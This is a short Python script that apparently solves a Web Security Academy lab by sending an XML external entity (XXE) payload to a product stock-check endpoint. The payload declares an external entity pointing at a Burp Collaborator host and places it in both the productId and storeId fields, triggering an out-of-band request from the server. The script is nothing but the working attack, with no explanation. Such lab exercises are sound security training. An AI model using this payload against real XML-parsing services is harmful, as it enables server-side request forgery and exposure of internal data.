import requests

url = "https://0a9600d8043b80ad801b80c600a60077.web-security-academy.net/product/stock"

xml = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://burpcollaborator.net/"> ]>
<stockCheck><productId>&xxe;</productId><storeId>&xxe;</storeId></stockCheck>'''

response = requests.post(url, data=xml)

print(response.text)